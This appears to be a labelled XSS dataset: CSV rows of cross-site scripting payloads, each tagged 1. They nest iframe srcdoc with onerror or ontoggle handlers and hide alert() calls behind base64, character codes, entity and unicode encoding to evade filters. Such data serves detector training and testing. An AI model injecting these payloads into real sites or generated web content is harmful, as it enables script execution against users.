"<iframe srcdoc=""<details open ontoggle=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<iframe onload=&#x61;lert&#x28;&#x31;&#x29;>"">",1
"<iframe srcdoc=""<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>""></iframe>",1
"<iframe srcdoc=""<iframe srcdoc='<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'>""></iframe>",1
"<iframe srcdoc=""<img src=# onerror=setTimeout(`alert\`4\``,0)>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=eval('window.ale'+'rt(22)')>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=eval(atob('YWxlcnQoNik='))>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=window['al'+'ert'](12)>""></iframe>",1
"<iframe srcdoc=""<img src=1 onerror=alert(String.fromCharCode(88,83,83))>"">",1
"<iframe srcdoc=""<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src=1 onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>""></iframe>",1
"<iframe srcdoc=""<img src=1 onerror=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=&#97;&#x6c;&#x65;&#x72;&#116;&#40;1&#41;>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;>"">",1
"<iframe srcdoc=""<img src=x onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>"">",1
"<iframe srcdoc=""<img src=x onerror=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>"">",1
"<iframe srcdoc=""<img src=x onerror='(new Function(`alert(20)`))()'>"">",1
"<iframe srcdoc=""<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"">",1
"<iframe srcdoc=""<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>"">",1
"<iframe srcdoc=""<img src=x onerror='eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='eval(`al\x65rt(32)`)'>"">",1
"<iframe srcdoc=""<img src=x onerror='eval(atob(`YWxlcnQoMSk=`))'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='eval(unescape(&#34;%61%6c%65%72%74%28%27%58%53%53%27%29&#34;))'>"">",1
"<iframe srcdoc=""<img src=x onerror='setTimeout(`alert(44)`,0)'>"">",1
"<iframe srcdoc=""<img src=x onerror='window.alert(1)'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='window[&quot;alert&quot;](1)'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='window[String.fromCharCode(97,108,101,114,116)](1)'>"">",1
"<iframe srcdoc=""<img src=x onerror='window[`al`+`ert`](1)'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=Function('&#97;&#108;&#101;&#114;&#116;(2)')() />""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=Function('al'+'ert(1)')()>"">",1
"<iframe srcdoc=""<img src=x onerror=Function('javascri'+'pt:alert(1)')()>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)>"">",1
"<iframe srcdoc=""<img src=x onerror=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('al'+String.fromCharCode(101,114,116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('window'+'.alert(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(119,105,110,100,111,119,32,46,32,97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(111)')>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(39)+String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83)+String.fromCharCode(39)+String.fromCharCode(41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"" />",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"" ></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(`window['\\x61lert'](1)`)>"" ></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&#39;YWxlcnQoMSk=&#39;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWx'+'lcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQ='))(1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTEp'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTEwKQ=='))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTIzKQ=='))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('d2luZG93WydhbGVydCddKDEp'))>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent(&#34;%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29&#34;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent(&#39;%61%6c%65%72%74%28%31%29&#39;))>""></iframe>",1
